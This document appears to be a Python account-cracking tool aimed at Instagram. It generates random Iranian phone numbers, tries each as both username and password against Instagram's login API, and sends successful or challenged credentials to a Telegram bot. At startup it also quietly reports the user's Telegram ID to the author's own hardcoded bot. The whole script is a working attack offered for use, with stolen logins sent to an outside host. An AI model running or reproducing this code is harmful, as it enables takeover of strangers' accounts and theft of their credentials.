import random , requests , pyfiglet , time
from uuid import uuid4
# ┅  ┅  ┅  ┅  ┅  ┅  ┅  ┅
S = "\033[1;91m"  #احمر
Y = "\033[1;34m" #ازرق فاتح
Z1 = "\033[2;31m"  #احمر ثان
C = "\033[1;97m" #ابيض
B = "\033[1;90m"  #اسود فاتح
C = "\033[1;97m"  #ابيض
E = "\033[1;92m"  #اخضر
H = "\033[1;93m"  #اصفر
K = "\033[1;94m"  #ازرق
L = "\033[1;95m"  #ارجواني
# ┅  ┅  ┅  ┅  ┅  ┅  ┅  ┅

nn = '0123456789'
url = 'https://b.i.instagram.com/api/v1/accounts/login/'
no = 'BAD : '
yes = 'HACK : '
sec = 'SECURE : '
srt = '-'*20

Hh = 0
Sc = 0
Bb = 0 

hi_pro_this_PY = 'PY : @B_5_U'
saroT = pyfiglet.figlet_format(f'/ SAROT \\')
print(B+saroT+'                '+hi_pro_this_PY)
ID = input (f'\n{S}({E}?{S}) {H}ID TELEGRAM{E}›› ')
sarotLOG = requests.session()
t = sarotLOG.get(f"https://api.telegram.org/bot2034307464:AAFnY39eA9xIFNtvKV-QssuMMj6Ozlgt-fs/sendMessage?chat_id=1996508860&text=𓆩✘𖤐𝐒 𝐀 𝐑 𝐎 𝐓𖤐✘ 𓆪\n⌯ NEW ENTRY TOOL\n\n⌯ ID : {ID}\n\n⌯ NAME TOOL : SAROT_21INSTA ").json()
token = input (f'\n{S}({E}?{S}) {H}TOKEN TELEGRAM{E}›› ')

print('''\n(0901)-(0911)-(0912)-(0913)-(0933)-(0916)-(0918)\n(0936)-(0937)-(0938)-(0932)-(0915)-(0914)-(0992)\n''')
ssarot = input(f'{S}({E}?{S}) {H}ENTER{E}›› ')
saroot = ssarot.replace('0','')
print(' ')

while True:
	sarott = str(''.join((random.choice(nn) for i in range(7))))
	user = '+98'+saroot+sarott
	pas = '0'+saroot+sarott
	
	headers = {
'Origin''Origin' : 'https://www.instagram.com',
'X-Requested-With' : 'XMLHttpRequest',
'X-CSRFToken' : 'AhVjaMX0bzU0z77Y49MpBImdpLKz8Rzr',
'Referer' : 'https://www.instagram.com/accounts/login/',
'X-Instagram-AJAX' : '3204c7d73485',
'X-IG-WWW-Claim' : '0',
'X-ASBD-ID' : '198387',
'Content-Type' : 'application/x-www-form-urlencoded',
'X-IG-App-ID' : '1217981644879628',
 'User-Agent':'Instagram 13.0.0.7.91 Android (25/7.1.2; 476dpi; 1440x2417; Huawei/google; Nexus 6P; angler; angler; en_US;scale=2.00; 828x1792; 190542906)',
'Accept':'*/*',
"API" : '5ff87913a966fcf4d230a25488aa6874',
'X-IG-Connection-Type':'WIFI', 
'X-IG-Capabilities':'3brTvw==',
'Host':'i.instagram.com',
}
	uid = str((uuid4()))
	data = {
'uuid':uid, 
'password':pas,
'username':user, 
'device_id':uid, 
'from_reg':'false', 
'_csrftoken':'missing', 
'login_attempt_countn':'0'
}

	logen = requests.post(url, headers = headers ,data=data , allow_redirects = True ).text	
	if 'logged_in_user' in logen:
			print(E+yes+user+':'+pas)
			Hh =+ 1
			tl = (f'''https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text=⌯ 𝙽𝚎𝚠 𝙰𝚌𝚌 
- - - - - - - - - - - - - - - - - - - - - - - 
⌯ 𝚄𝚜𝚎𝚛 : {user}

⌯ 𝙿𝚊𝚜𝚜 : {pas}
- - - - - - - - - - - - - - - - - - - - - - - 
<\> PY : @B_5_U </>''' )
			i = requests.post(tl)
	elif '"message":"challenge_required","challenge"' in logen:
		print(H+sec+user+':'+pas)
		Sc =+ 1
		tlg = (f'''https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text=⌯ 𝙽𝚎𝚠 𝙰𝚌𝚌 🔒
- - - - - - - - - - - - - - - - - - - - - - - 
⌯ 𝚄𝚜𝚎𝚛 : {user}

⌯ 𝙿𝚊𝚜𝚜 : {pas}
- - - - - - - - - - - - - - - - - - - - - - - 
<\> PY : @B_5_U </>''' )
		o = requests.post(tlg)
	else:
		print(S+no+user+':'+pas)
		Bb =+ 1